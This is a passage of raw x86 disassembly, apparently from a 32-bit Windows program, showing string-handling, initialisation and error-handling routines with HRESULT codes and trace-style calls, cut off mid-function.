  4038d0:	mov    esi,0x4015c8
  4038d5:	jmp    0x4038dc
  4038d7:	mov    esi,0x4015d8
  4038dc:	push   eax
  4038dd:	push   ecx
  4038de:	push   esi
  4038df:	push   ebx
  4038e0:	push   edi
  4038e1:	push   0x2b
  4038e3:	push   DWORD PTR [ebp+0xc]
  4038e6:	push   DWORD PTR [ebp+0x8]
  4038e9:	call   DWORD PTR ds:0x40a03c
  4038ef:	add    esp,0x20
  4038f2:	pop    edi
  4038f3:	pop    esi
  4038f4:	pop    ebx
  4038f5:	mov    esp,ebp
  4038f7:	pop    ebp
  4038f8:	ret    0xc
  4038fb:	int3   
  4038fc:	int3   
  4038fd:	int3   
  4038fe:	int3   
  4038ff:	int3   
  403900:	mov    edi,edi
  403902:	push   ebp
  403903:	mov    ebp,esp
  403905:	mov    edx,DWORD PTR [ebp+0x10]
  403908:	push   ebx
  403909:	push   esi
  40390a:	xor    ebx,ebx
  40390c:	mov    esi,ecx
  40390e:	push   edi
  40390f:	test   edx,edx
  403911:	je     0x403939
  403913:	cmp    WORD PTR [edx],bx
  403916:	jne    0x40391c
  403918:	push   0xe
  40391a:	jmp    0x40393b
  40391c:	mov    ecx,edx
  40391e:	lea    edi,[ecx+0x2]
  403921:	mov    ax,WORD PTR [ecx]
  403924:	add    ecx,0x2
  403927:	cmp    ax,bx
  40392a:	jne    0x403921
  40392c:	sub    ecx,edi
  40392e:	sar    ecx,1
  403930:	lea    ecx,[ecx*2+0x2]
  403937:	jmp    0x40393c
  403939:	push   0xa
  40393b:	pop    ecx
  40393c:	test   edx,edx
  40393e:	je     0x40394c
  403940:	cmp    WORD PTR [edx],bx
  403943:	jne    0x403951
  403945:	mov    edx,0x4015c8
  40394a:	jmp    0x403951
  40394c:	mov    edx,0x4015d8
  403951:	push   ebx
  403952:	push   0x4
  403954:	lea    eax,[ebp+0x14]
  403957:	push   eax
  403958:	push   ecx
  403959:	push   edx
  40395a:	push   esi
  40395b:	push   0x4018b4
  403960:	push   0x2b
  403962:	push   DWORD PTR [ebp+0xc]
  403965:	push   DWORD PTR [ebp+0x8]
  403968:	call   DWORD PTR ds:0x40a03c
  40396e:	add    esp,0x28
  403971:	pop    edi
  403972:	pop    esi
  403973:	pop    ebx
  403974:	pop    ebp
  403975:	ret    0x10
  403978:	int3   
  403979:	int3   
  40397a:	int3   
  40397b:	int3   
  40397c:	int3   
  40397d:	mov    edi,edi
  40397f:	push   ebp
  403980:	mov    ebp,esp
  403982:	xor    edx,edx
  403984:	mov    DWORD PTR [ecx],edx
  403986:	mov    DWORD PTR [ecx+0x4],edx
  403989:	mov    DWORD PTR [ecx+0x8],edx
  40398c:	mov    DWORD PTR [ecx+0xc],edx
  40398f:	mov    DWORD PTR [ecx+0x10],edx
  403992:	push   0xa
  403994:	pop    eax
  403995:	mov    DWORD PTR [ecx+0x14],eax
  403998:	mov    DWORD PTR [ecx+0x2c],eax
  40399b:	mov    DWORD PTR [ecx+0x18],edx
  40399e:	mov    DWORD PTR [ecx+0x1c],edx
  4039a1:	mov    DWORD PTR [ecx+0x20],edx
  4039a4:	mov    DWORD PTR [ecx+0x24],edx
  4039a7:	mov    DWORD PTR [ecx+0x28],edx
  4039aa:	mov    DWORD PTR [ecx+0x44],eax
  4039ad:	mov    DWORD PTR [ecx+0x30],edx
  4039b0:	mov    DWORD PTR [ecx+0x34],edx
  4039b3:	mov    DWORD PTR [ecx+0x38],edx
  4039b6:	mov    DWORD PTR [ecx+0x3c],edx
  4039b9:	mov    DWORD PTR [ecx+0x40],edx
  4039bc:	mov    DWORD PTR [ecx+0x5c],eax
  4039bf:	mov    eax,DWORD PTR [ebp+0x8]
  4039c2:	mov    DWORD PTR [ecx+0x48],edx
  4039c5:	mov    DWORD PTR [ecx+0x4c],edx
  4039c8:	mov    DWORD PTR [ecx+0x50],edx
  4039cb:	mov    DWORD PTR [ecx+0x54],edx
  4039ce:	mov    DWORD PTR [ecx+0x58],edx
  4039d1:	mov    DWORD PTR [ecx+0x64],eax
  4039d4:	mov    eax,ecx
  4039d6:	mov    DWORD PTR [ecx+0x60],edx
  4039d9:	mov    DWORD PTR [ecx+0x68],edx
  4039dc:	pop    ebp
  4039dd:	ret    0x4
  4039e0:	int3   
  4039e1:	int3   
  4039e2:	int3   
  4039e3:	int3   
  4039e4:	int3   
  4039e5:	mov    edi,edi
  4039e7:	push   esi
  4039e8:	mov    esi,ecx
  4039ea:	lea    ecx,[esi+0x48]
  4039ed:	call   0x405a71
  4039f2:	lea    ecx,[esi+0x30]
  4039f5:	call   0x405a71
  4039fa:	lea    ecx,[esi+0x18]
  4039fd:	call   0x405a71
  403a02:	mov    ecx,esi
  403a04:	pop    esi
  403a05:	jmp    0x405a71
  403a0a:	int3   
  403a0b:	int3   
  403a0c:	int3   
  403a0d:	int3   
  403a0e:	int3   
  403a0f:	mov    edi,edi
  403a11:	push   ebp
  403a12:	mov    ebp,esp
  403a14:	and    esp,0xfffffff8
  403a17:	sub    esp,0xc
  403a1a:	push   ebx
  403a1b:	push   esi
  403a1c:	push   edi
  403a1d:	mov    esi,ecx
  403a1f:	call   0x403ffe
  403a24:	test   eax,eax
  403a26:	js     0x403bb0
  403a2c:	xor    edi,edi
  403a2e:	call   0x404d2a
  403a33:	test   eax,eax
  403a35:	je     0x403ad4
  403a3b:	cmp    DWORD PTR [esi+0x20],edi
  403a3e:	je     0x403ad4
  403a44:	call   0x404bb4
  403a49:	mov    ecx,DWORD PTR [esi+0x18]
  403a4c:	mov    DWORD PTR [esp+0x10],eax
  403a50:	mov    DWORD PTR [esp+0xc],ecx
  403a54:	test   ecx,ecx
  403a56:	je     0x403bae
  403a5c:	lea    eax,[esp+0xc]
  403a60:	push   eax
  403a61:	call   0x405ac9
  403a66:	mov    ecx,DWORD PTR [eax]
  403a68:	call   0x402b01
  403a6d:	mov    ebx,eax
  403a6f:	test   ebx,ebx
  403a71:	je     0x403aca
  403a73:	cmp    DWORD PTR [esp+0x10],0x0
  403a78:	je     0x403a80
  403a7a:	cmp    DWORD PTR [ebx+0x20],0x0
  403a7e:	je     0x403abe
  403a80:	push   0x0
  403a82:	push   ecx
  403a83:	push   ebx
  403a84:	mov    ecx,esi
  403a86:	call   0x403bbc
  403a8b:	mov    DWORD PTR [esp+0x14],eax
  403a8f:	test   eax,eax
  403a91:	jns    0x403abe
  403a93:	mov    ecx,DWORD PTR ds:0x40900c
  403a99:	cmp    ecx,0x40900c
  403a9f:	je     0x403abc
  403aa1:	test   BYTE PTR [ecx+0x1c],0x8
  403aa5:	je     0x403abc
  403aa7:	push   edi
  403aa8:	push   DWORD PTR [ebx]
  403aaa:	push   DWORD PTR [ecx+0x14]
  403aad:	push   DWORD PTR [ecx+0x10]
  403ab0:	push   0xa
  403ab2:	pop    ecx
  403ab3:	call   0x403900
  403ab8:	mov    eax,DWORD PTR [esp+0x14]
  403abc:	mov    edi,eax
  403abe:	cmp    DWORD PTR [esp+0xc],0x0
  403ac3:	jne    0x403a5c
  403ac5:	jmp    0x403bae
  403aca:	mov    eax,0x8007000e
  403acf:	jmp    0x403bb0
  403ad4:	mov    eax,DWORD PTR [esi]
  403ad6:	mov    ebx,0x40900c
  403adb:	mov    DWORD PTR [esp+0xc],eax
  403adf:	test   eax,eax
  403ae1:	je     0x403b41
  403ae3:	lea    eax,[esp+0xc]
  403ae7:	push   eax
  403ae8:	call   0x405ac9
  403aed:	mov    ecx,DWORD PTR [eax]
  403aef:	call   0x402b01
  403af4:	mov    DWORD PTR [esp+0x14],eax
  403af8:	test   eax,eax
  403afa:	je     0x403aca
  403afc:	push   0x0
  403afe:	push   ecx
  403aff:	push   eax
  403b00:	mov    ecx,esi
  403b02:	call   0x403bbc
  403b07:	mov    DWORD PTR [esp+0x10],eax
  403b0b:	test   eax,eax
  403b0d:	jns    0x403b3a
  403b0f:	mov    ecx,DWORD PTR ds:0x40900c
  403b15:	cmp    ecx,ebx
  403b17:	je     0x403b38
  403b19:	test   BYTE PTR [ecx+0x1c],0x8
  403b1d:	je     0x403b38
  403b1f:	mov    eax,DWORD PTR [esp+0x14]
  403b23:	push   edi
  403b24:	push   DWORD PTR [eax]
  403b26:	push   DWORD PTR [ecx+0x14]
  403b29:	push   DWORD PTR [ecx+0x10]
  403b2c:	push   0xb
  403b2e:	pop    ecx
  403b2f:	call   0x403900
  403b34:	mov    eax,DWORD PTR [esp+0x10]
  403b38:	mov    edi,eax
  403b3a:	cmp    DWORD PTR [esp+0xc],0x0
  403b3f:	jne    0x403ae3
  403b41:	mov    eax,DWORD PTR [esi+0x30]
  403b44:	mov    DWORD PTR [esp+0xc],eax
  403b48:	test   eax,eax
  403b4a:	je     0x403bae
  403b4c:	lea    eax,[esp+0xc]
  403b50:	push   eax
  403b51:	call   0x405ac9
  403b56:	mov    ecx,DWORD PTR [eax]
  403b58:	call   0x402b01
  403b5d:	mov    DWORD PTR [esp+0x14],eax
  403b61:	test   eax,eax
  403b63:	je     0x403aca
  403b69:	push   0x0
  403b6b:	push   ecx
  403b6c:	push   eax
  403b6d:	mov    ecx,esi
  403b6f:	call   0x403bbc
  403b74:	mov    DWORD PTR [esp+0x10],eax
  403b78:	test   eax,eax
  403b7a:	jns    0x403ba7
  403b7c:	mov    ecx,DWORD PTR ds:0x40900c
  403b82:	cmp    ecx,ebx
  403b84:	je     0x403ba5
  403b86:	test   BYTE PTR [ecx+0x1c],0x8
  403b8a:	je     0x403ba5
  403b8c:	mov    eax,DWORD PTR [esp+0x14]
  403b90:	push   edi
  403b91:	push   DWORD PTR [eax]
  403b93:	push   DWORD PTR [ecx+0x14]
  403b96:	push   DWORD PTR [ecx+0x10]
  403b99:	push   0xc
  403b9b:	pop    ecx
  403b9c:	call   0x403900
  403ba1:	mov    eax,DWORD PTR [esp+0x10]
  403ba5:	mov    edi,eax
  403ba7:	cmp    DWORD PTR [esp+0xc],0x0
  403bac:	jne    0x403b4c
  403bae:	mov    eax,edi
  403bb0:	pop    edi
  403bb1:	pop    esi
  403bb2:	pop    ebx
  403bb3:	mov    esp,ebp
  403bb5:	pop    ebp
  403bb6:	ret    
  403bb7:	int3   
  403bb8:	int3   
  403bb9:	int3   
  403bba:	int3   
  403bbb:	int3   
  403bbc:	mov    edi,edi
  403bbe:	push   ebp
  403bbf:	mov    ebp,esp
  403bc1:	and    esp,0xfffffff8
  403bc4:	push   0xffffffff
  403bc6:	push   0x40810f
  403bcb:	mov    eax,fs:0x0
  403bd1:	push   eax
  403bd2:	sub    esp,0x18
  403bd5:	push   ebx
  403bd6:	push   esi
  403bd7:	push   edi
  403bd8:	mov    eax,ds:0x409004
  403bdd:	xor    eax,esp
  403bdf:	push   eax
  403be0:	lea    eax,[esp+0x28]
  403be4:	mov    fs:0x0,eax
  403bea:	mov    ebx,ecx
  403bec:	mov    DWORD PTR [esp+0x20],ebx
  403bf0:	and    DWORD PTR [esp+0x18],0x0
  403bf5:	mov    edi,DWORD PTR [ebp+0x8]
  403bf8:	test   edi,edi
  403bfa:	jne    0x403c06
  403bfc:	mov    eax,0x80070057
  403c01:	jmp    0x403eca
  403c06:	call   0x403ffe
  403c0b:	mov    DWORD PTR [esp+0x14],eax
  403c0f:	test   eax,eax
  403c11:	js     0x403eca
  403c17:	lea    esi,[edi+0x28]
  403c1a:	mov    ecx,esi
  403c1c:	call   0x40566f
  403c21:	test   al,al
  403c23:	je     0x403c54
  403c25:	call   0x404d2a
  403c2a:	test   eax,eax
  403c2c:	jne    0x403c54
  403c2e:	mov    ecx,DWORD PTR [esi]
  403c30:	call   0x402b01
  403c35:	test   eax,eax
  403c37:	jne    0x403c43
  403c39:	mov    eax,0x8007000e
  403c3e:	jmp    0x403eca
  403c43:	push   0x0
  403c45:	push   0x0
  403c47:	push   eax
  403c48:	mov    ecx,ebx
  403c4a:	call   0x403bbc
  403c4f:	jmp    0x403eca
  403c54:	mov    eax,DWORD PTR [edi+0x14]
  403c57:	mov    edx,0x401598
  403c5c:	mov    si,WORD PTR [eax]
  403c5f:	xor    ecx,ecx
  403c61:	inc    ecx
  403c62:	mov    DWORD PTR [esp+0x1c],ecx
  403c66:	cmp    si,WORD PTR [edx]
  403c69:	jne    0x403c89
  403c6b:	test   si,si
  403c6e:	je     0x403c85
  403c70:	mov    si,WORD PTR [eax+0x2]
  403c74:	cmp    si,WORD PTR [edx+0x2]
  403c78:	jne    0x403c89
  403c7a:	add    eax,0x4
  403c7d:	add    edx,0x4
  403c80:	test   si,si
  403c83:	jne    0x403c5c
  403c85:	xor    eax,eax
  403c87:	jmp    0x403c8d
  403c89:	sbb    eax,eax
  403c8b:	or     eax,ecx
  403c8d:	test   eax,eax
  403c8f:	sete   al
  403c92:	test   al,al
  403c94:	je     0x403d82
  403c9a:	push   DWORD PTR [edi+0xc]
  403c9d:	call   DWORD PTR ds:0x40a178
  403ca3:	pop    ecx
  403ca4:	cmp    eax,0x16
  403ca7:	jae    0x403ec6
  403cad:	push   DWORD PTR [ebx+0x64]
  403cb0:	mov    edx,eax
  403cb2:	mov    ecx,edi
  403cb4:	push   0x0
  403cb6:	call   0x406bee
  403cbb:	mov    DWORD PTR [esp+0x14],eax
  403cbf:	test   eax,eax
  403cc1:	js     0x403ec6
  403cc7:	call   0x404d2a
  403ccc:	test   eax,eax
  403cce:	je     0x403cf4
  403cd0:	mov    ecx,DWORD PTR [edi]
  403cd2:	sub    ecx,0x10
  403cd5:	call   0x405870
  403cda:	push   ecx
  403cdb:	mov    ecx,ebx
  403cdd:	mov    DWORD PTR [esp+0x1c],0x1
  403ce5:	lea    esi,[eax+0x10]
  403ce8:	push   esi
  403ce9:	call   0x405af2
  403cee:	test   eax,eax
  403cf0:	je     0x403cf8
  403cf2:	jmp    0x403cfd
  403cf4:	mov    esi,DWORD PTR [esp+0x20]
  403cf8:	mov    BYTE PTR [esp+0x1c],0x0
  403cfd:	test   BYTE PTR [esp+0x18],0x1
  403d02:	je     0x403d0c
  403d04:	lea    ecx,[esi-0x10]
  403d07:	call   0x403776
  403d0c:	cmp    BYTE PTR [esp+0x1c],0x0
  403d11:	je     0x403ec6
  403d17:	mov    ecx,DWORD PTR [edi]
  403d19:	sub    ecx,0x10
  403d1c:	call   0x405870
  403d21:	push   ecx
  403d22:	lea    esi,[eax+0x10]
  403d25:	lea    eax,[ebx+0x18]
  403d28:	push   esi
  403d29:	mov    ecx,eax
  403d2b:	mov    DWORD PTR [esp+0x24],eax
  403d2f:	call   0x405af2
  403d34:	mov    ebx,eax
  403d36:	lea    ecx,[esi-0x10]
  403d39:	neg    ebx
  403d3b:	sbb    bl,bl
  403d3d:	call   0x403776
  403d42:	add    bl,0x1
  403d45:	je     0x403d74
  403d47:	mov    ecx,DWORD PTR [edi]
  403d49:	sub    ecx,0x10
  403d4c:	call   0x405870
  403d51:	lea    esi,[eax+0x10]
  403d54:	mov    DWORD PTR [esp+0x18],esi
  403d58:	mov    ecx,DWORD PTR [esp+0x1c]
  403d5c:	and    DWORD PTR [esp+0x30],0x0
  403d61:	push   esi
  403d62:	call   0x405a43
  403d67:	or     DWORD PTR [esp+0x30],0xffffffff
  403d6c:	lea    ecx,[esi-0x10]
  403d6f:	call   0x403776
  403d74:	mov    ecx,DWORD PTR [esp+0x20]
  403d78:	call   0x404388
  403d7d:	jmp    0x403ec6
  403d82:	mov    esi,DWORD PTR [edi+0xc]
  403d85:	test   esi,esi
  403d87:	jne    0x403d93
  403d89:	mov    eax,0x80004005
  403d8e:	jmp    0x403eca
  403d93:	call   0x404d2a
  403d98:	test   eax,eax
  403d9a:	je     0x403de3
  403d9c:	xor    ecx,ecx
  403d9e:	call   0x406f40
  403da3:	test   eax,eax
  403da5:	jne    0x403de3
  403da7:	cmp    DWORD PTR [edi+0x20],eax
  403daa:	jne    0x403dd1
  403dac:	cmp    DWORD PTR [ebp+0x10],eax
  403daf:	je     0x403dc7
  403db1:	mov    ecx,edi
  403db3:	call   0x402d20
  403db8:	test   eax,eax
  403dba:	jne    0x403ddc
  403dbc:	push   0x1
  403dbe:	mov    ecx,edi
  403dc0:	call   0x40490a
  403dc5:	jmp    0x403ddc
  403dc7:	push   ecx
  403dc8:	push   edi
  403dc9:	push   esi
  403dca:	call   0x4046d2
  403dcf:	jmp    0x403ddc
  403dd1:	push   edi
  403dd2:	call   0x405151
  403dd7:	call   0x405f05
  403ddc:	xor    eax,eax
  403dde:	jmp    0x403eca
  403de3:	cmp    DWORD PTR [edi+0x20],0x0
  403de7:	jne    0x403e0f
  403de9:	call   0x404d2a
  403dee:	test   eax,eax
  403df0:	je     0x403e0f
  403df2:	mov    ecx,edi
  403df4:	call   0x402d20
  403df9:	test   eax,eax
  403dfb:	je     0x403e04
  403dfd:	and    DWORD PTR [esp+0x14],0x0
  403e02:	jmp    0x403e23
  403e04:	push   0x0
  403e06:	mov    ecx,edi
  403e08:	call   0x40490a
  403e0d:	jmp    0x403e17
  403e0f:	push   ecx
  403e10:	push   edi
  403e11:	push   esi
  403e12:	call   0x4046d2
  403e17:	mov    DWORD PTR [esp+0x14],eax
  403e1b:	test   eax,eax
  403e1d:	js     0x403ec6
  403e23:	call   DWORD PTR ds:0x40a204
  403e29:	test   eax,eax
  403e2b:	je     0x403e34
  403e2d:	mov    ecx,edi
  403e2f:	call   0x403ee4
  403e34:	xor    ecx,ecx
  403e36:	call   0x406f40
  403e3b:	test   eax,eax
  403e3d:	je     0x403ec6
  403e43:	call   0x404d2a
  403e48:	test   eax,eax
  403e4a:	je     0x403ec6
  403e4c:	mov    ecx,DWORD PTR [edi]
  403e4e:	sub    ecx,0x10
  403e51:	call   0x405870
  403e56:	push   ecx
  403e57:	lea    esi,[eax+0x10]
  403e5a:	lea    eax,[ebx+0x18]
  403e5d:	push   esi
  403e5e:	mov    ecx,eax
  403e60:	mov    DWORD PTR [esp+0x24],eax
  403e64:	call   0x405af2
  403e69:	mov    ebx,eax
  403e6b:	lea    ecx,[esi-0x10]
  403e6e:	neg    ebx
  403e70:	sbb    bl,bl
  403e72:	call   0x403776
  403e77:	add    bl,0x1
  403e7a:	je     0x403eac
  403e7c:	mov    ecx,DWORD PTR [edi]
  403e7e:	sub    ecx,0x10
  403e81:	call   0x405870
  403e86:	lea    esi,[eax+0x10]
  403e89:	mov    DWORD PTR [esp+0x18],esi
  403e8d:	mov    ecx,DWORD PTR [esp+0x1c]
  403e91:	push   esi
  403e92:	mov    DWORD PTR [esp+0x34],0x1
  403e9a:	call   0x405a43
  403e9f:	or     DWORD PTR [esp+0x30],0xffffffff
  403ea4:	lea    ecx,[esi-0x10]
  403ea7:	call   0x403776
  403eac:	mov    ecx,DWORD PTR [esp+0x20]
  403eb0:	call   0x404388
  403eb5:	cmp    DWORD PTR [edi+0x24],0x0
  403eb9:	jne    0x403ec1
  403ebb:	cmp    DWORD PTR [edi+0x20],0x0
  403ebf:	jne    0x403ec6
  403ec1:	call   0x406a57
  403ec6:	mov    eax,DWORD PTR [esp+0x14]
  403eca:	mov    ecx,DWORD PTR [esp+0x28]
  403ece:	mov    DWORD PTR fs:0x0,ecx
  403ed5:	pop    ecx
  403ed6:	pop    edi
  403ed7:	pop    esi
  403ed8:	pop    ebx
  403ed9:	mov    esp,ebp
  403edb:	pop    ebp
  403edc:	ret    0xc
  403edf:	int3   
  403ee0:	int3   
  403ee1:	int3   
  403ee2:	int3   
  403ee3:	int3   
  403ee4:	mov    edi,edi
  403ee6:	push   ebp
  403ee7:	mov    ebp,esp
  403ee9:	push   ecx
  403eea:	push   ecx
  403eeb:	push   esi
  403eec:	mov    esi,DWORD PTR [ecx+0xc]
  403eef:	test   esi,esi
  403ef1:	je     0x403f33
  403ef3:	push   0x5c
  403ef5:	push   esi
  403ef6:	call   DWORD PTR ds:0x40a188
  403efc:	pop    ecx
  403efd:	pop    ecx
  403efe:	test   eax,eax
  403f00:	je     0x403f05
  403f02:	lea    esi,[eax+0x2]
  403f05:	xor    ecx,ecx
  403f07:	test   esi,esi
  403f09:	je     0x403f13
  403f0b:	cmp    WORD PTR [esi],cx
  403f0e:	mov    DWORD PTR [ebp-0x4],esi
  403f11:	jne    0x403f1a
  403f13:	mov    DWORD PTR [ebp-0x4],0x4015b8
  403f1a:	lea    eax,[ebp-0x8]
  403f1d:	mov    DWORD PTR [ebp-0x8],0x2
  403f24:	push   eax
  403f25:	push   0x1
  403f27:	push   0x107d
  403f2c:	push   ecx
  403f2d:	call   DWORD PTR ds:0x40a200
  403f33:	pop    esi
  403f34:	mov    esp,ebp
  403f36:	pop    ebp
  403f37:	ret    
  403f38:	int3   
  403f39:	int3   
  403f3a:	int3   
  403f3b:	int3   
  403f3c:	int3   
  403f3d:	push   0x814
  403f42:	mov    eax,0x408145
  403f47:	call   0x407f14
  403f4c:	lea    esi,[ecx+0x18]
  403f4f:	mov    ecx,esi
  403f51:	call   0x405a71
  403f56:	xor    ebx,ebx
  403f58:	mov    DWORD PTR [ebp-0x820],ebx
  403f5e:	mov    DWORD PTR [ebp-0x81c],ebx
  403f64:	mov    DWORD PTR [ebp-0x818],ebx
  403f6a:	xor    eax,eax
  403f6c:	mov    DWORD PTR [ebp-0x4],ebx
  403f6f:	push   0x7fe
  403f74:	mov    WORD PTR [ebp-0x810],ax
  403f7b:	lea    eax,[ebp-0x80e]
  403f81:	push   ebx
  403f82:	push   eax
  403f83:	call   0x407e84
  403f88:	add    esp,0xc
  403f8b:	lea    eax,[ebp-0x820]
  403f91:	push   eax
  403f92:	push   ecx
  403f93:	lea    eax,[ebp-0x810]
  403f99:	push   eax
  403f9a:	call   0x404de0
  403f9f:	lea    eax,[ebp-0x810]
  403fa5:	push   eax
  403fa6:	lea    ecx,[ebp-0x814]
  403fac:	call   0x4054f4
  403fb1:	mov    edx,esi
  403fb3:	mov    BYTE PTR [ebp-0x4],0x1
  403fb7:	lea    ecx,[ebp-0x814]
  403fbd:	call   0x4045b5
  403fc2:	mov    BYTE PTR [ebp-0x4],bl
  403fc5:	mov    ecx,DWORD PTR [ebp-0x814]
  403fcb:	lea    ecx,[ecx-0x10]
  403fce:	call   0x403776
  403fd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  403fd7:	cmp    DWORD PTR [ebp-0x820],ebx
  403fdd:	je     0x403ff1
  403fdf:	push   DWORD PTR [ebp-0x820]
  403fe5:	call   DWORD PTR ds:0x40a034
  403feb:	mov    DWORD PTR [ebp-0x820],ebx
  403ff1:	mov    eax,esi
  403ff3:	call   0x407eb4
  403ff8:	ret    
  403ff9:	int3   
  403ffa:	int3   
  403ffb:	int3   
  403ffc:	int3   
  403ffd:	int3   
  403ffe:	mov    edi,edi
  404000:	push   ebp
  404001:	mov    ebp,esp
  404003:	push   0xffffffff
  404005:	push   0x4081bf
  40400a:	mov    eax,fs:0x0
  404010:	push   eax
  404011:	mov    eax,0x203c
  404016:	call   0x407fe0
  40401b:	mov    eax,ds:0x409004
  404020:	xor    eax,ebp
  404022:	mov    DWORD PTR [ebp-0x10],eax
  404025:	push   ebx
  404026:	push   esi
  404027:	push   edi
  404028:	push   eax
  404029:	lea    eax,[ebp-0xc]
  40402c:	mov    fs:0x0,eax
  404032:	mov    edi,ecx
  404034:	xor    ebx,ebx
  404036:	cmp    DWORD PTR [edi+0x60],ebx
  404039:	je     0x404042
  40403b:	xor    eax,eax
  40403d:	jmp    0x404367
  404042:	mov    DWORD PTR [edi+0x60],0x1
  404049:	mov    DWORD PTR [ebp-0x2030],ebx
  40404f:	mov    DWORD PTR [ebp-0x202c],ebx
  404055:	mov    DWORD PTR [ebp-0x2028],ebx
  40405b:	xor    eax,eax
  40405d:	mov    DWORD PTR [ebp-0x4],ebx
  404060:	mov    esi,0x7fe
  404065:	mov    WORD PTR [ebp-0x810],ax
  40406c:	push   esi
  40406d:	lea    eax,[ebp-0x80e]
  404073:	push   ebx
  404074:	push   eax
  404075:	call   0x407e84
  40407a:	add    esp,0xc
  40407d:	mov    DWORD PTR [ebp-0x2044],ebx
  404083:	mov    DWORD PTR [ebp-0x2040],ebx
  404089:	mov    DWORD PTR [ebp-0x203c],ebx
  40408f:	xor    eax,eax
  404091:	mov    BYTE PTR [ebp-0x4],0x1
  404095:	push   esi
  404096:	mov    WORD PTR [ebp-0x1010],ax
  40409d:	lea    eax,[ebp-0x100e]
  4040a3:	push   ebx
  4040a4:	push   eax
  4040a5:	call   0x407e84
  4040aa:	add    esp,0xc
  4040ad:	lea    eax,[ebp-0x2044]
  4040b3:	push   eax
  4040b4:	push   ecx
  4040b5:	lea    eax,[ebp-0x1010]
  4040bb:	push   eax
  4040bc:	call   0x404de0
  4040c1:	lea    eax,[ebp-0x1010]
  4040c7:	push   eax
  4040c8:	lea    ecx,[ebp-0x2038]
  4040ce:	call   0x4054f4
  4040d3:	lea    edx,[edi+0x18]
  4040d6:	mov    BYTE PTR [ebp-0x4],0x2
  4040da:	lea    ecx,[ebp-0x2038]
  4040e0:	call   0x4045b5
  4040e5:	call   0x404d2a
  4040ea:	test   eax,eax
  4040ec:	je     0x4042cb
  4040f2:	mov    DWORD PTR [ebp-0x2024],ebx
  4040f8:	mov    DWORD PTR [ebp-0x2020],ebx
  4040fe:	mov    DWORD PTR [ebp-0x201c],ebx
  404104:	xor    eax,eax
  404106:	mov    BYTE PTR [ebp-0x4],0x3
  40410a:	push   esi
  40410b:	mov    WORD PTR [ebp-0x2010],ax
  404112:	lea    eax,[ebp-0x200e]
  404118:	push   ebx
  404119:	push   eax
  40411a:	call   0x407e84
  40411f:	add    esp,0xc
  404122:	xor    eax,eax
  404124:	mov    WORD PTR [ebp-0x1810],ax
  40412b:	lea    eax,[ebp-0x180e]
  404131:	push   esi
  404132:	push   ebx
  404133:	push   eax
  404134:	call   0x407e84
  404139:	add    esp,0xc
  40413c:	lea    eax,[ebp-0x2024]
  404142:	push   eax
  404143:	push   ecx
  404144:	lea    eax,[ebp-0x1810]
  40414a:	push   eax
  40414b:	push   ecx
  40414c:	lea    eax,[ebp-0x2010]
  404152:	mov    ecx,edi
  404154:	push   eax
  404155:	call   0x404f98
  40415a:	lea    eax,[ebp-0x2010]
  404160:	push   eax
  404161:	lea    ecx,[ebp-0x2018]
  404167:	call   0x4054f4
  40416c:	lea    eax,[ebp-0x1810]
  404172:	mov    BYTE PTR [ebp-0x4],0x4
  404176:	push   eax
  404177:	lea    ecx,[ebp-0x2014]
  40417d:	call   0x4054f4
  404182:	lea    edx,[edi+0x30]
  404185:	mov    BYTE PTR [ebp-0x4],0x5
  404189:	lea    ecx,[ebp-0x2018]
  40418f:	call   0x4045b5
  404194:	lea    edx,[edi+0x48]
  404197:	lea    ecx,[ebp-0x2014]
  40419d:	call   0x4045b5
  4041a2:	lea    eax,[ebp-0x2030]
  4041a8:	push   eax
  4041a9:	push   0x400
  4041ae:	lea    ecx,[ebp-0x810]
  4041b4:	call   0x404ec2
  4041b9:	mov    esi,eax
  4041bb:	test   esi,esi
  4041bd:	jns    0x404286
  4041c3:	cmp    si,0x2
  4041c7:	je     0x4041e6
  4041c9:	mov    eax,ds:0x40900c
  4041ce:	cmp    eax,0x40900c
  4041d3:	je     0x40423a
  4041d5:	test   BYTE PTR [eax+0x1c],0x8
  4041d9:	je     0x40423a
  4041db:	push   esi
  4041dc:	push   DWORD PTR [eax+0x14]
  4041df:	push   DWORD PTR [eax+0x10]
  4041e2:	push   0xf
  4041e4:	jmp    0x404234
  4041e6:	push   ecx
  4041e7:	lea    eax,[ebp-0x1010]
  4041ed:	mov    edx,0x200
  4041f2:	push   eax
  4041f3:	push   ecx
  4041f4:	lea    ecx,[ebp-0x810]
  4041fa:	call   0x405eb5
  4041ff:	lea    eax,[ebp-0x2030]
  404205:	push   eax
  404206:	push   ecx
  404207:	lea    eax,[ebp-0x810]
  40420d:	push   eax
  40420e:	call   0x4051be
  404213:	mov    esi,eax
  404215:	test   esi,esi
  404217:	jns    0x404286
  404219:	mov    eax,ds:0x40900c
  40421e:	cmp    eax,0x40900c
  404223:	je     0x40423a
  404225:	test   BYTE PTR [eax+0x1c],0x8
  404229:	je     0x40423a
  40422b:	push   esi
  40422c:	push   DWORD PTR [eax+0x14]
  40422f:	push   DWORD PTR [eax+0x10]
  404232:	push   0x10
  404234:	pop    ecx
  404235:	call   0x403855
  40423a:	mov    BYTE PTR [ebp-0x4],0x4
  40423e:	mov    ecx,DWORD PTR [ebp-0x2014]
  404244:	lea    ecx,[ecx-0x10]
  404247:	call   0x403776
  40424c:	mov    BYTE PTR [ebp-0x4],0x3
  404250:	mov    ecx,DWORD PTR [ebp-0x2018]
  404256:	lea    ecx,[ecx-0x10]
  404259:	call   0x403776
  40425e:	mov    BYTE PTR [ebp-0x4],0x2
  404262:	cmp    DWORD PTR [ebp-0x2024],0x0
  404269:	je     0x404316
  40426f:	push   DWORD PTR [ebp-0x2024]
  404275:	call   DWORD PTR ds:0x40a034
  40427b:	mov    DWORD PTR [ebp-0x2024],ebx
  404281:	jmp    0x404316
  404286:	mov    BYTE PTR [ebp-0x4],0x4
  40428a:	mov    ecx,DWORD PTR [ebp-0x2014]
  404290:	lea    ecx,[ecx-0x10]
  404293:	call   0x403776
  404298:	mov    BYTE PTR [ebp-0x4],0x3
  40429c:	mov    ecx,DWORD PTR [ebp-0x2018]
  4042a2:	lea    ecx,[ecx-0x10]
  4042a5:	call   0x403776
  4042aa:	mov    BYTE PTR [ebp-0x4],0x2
  4042ae:	cmp    DWORD PTR [ebp-0x2024],0x0
  4042b5:	je     0x4042df
  4042b7:	push   DWORD PTR [ebp-0x2024]
  4042bd:	call   DWORD PTR ds:0x40a034
  4042c3:	mov    DWORD PTR [ebp-0x2024],ebx
  4042c9:	jmp    0x4042df
  4042cb:	lea    eax,[ebp-0x2030]
  4042d1:	push   eax
  4042d2:	push   ecx
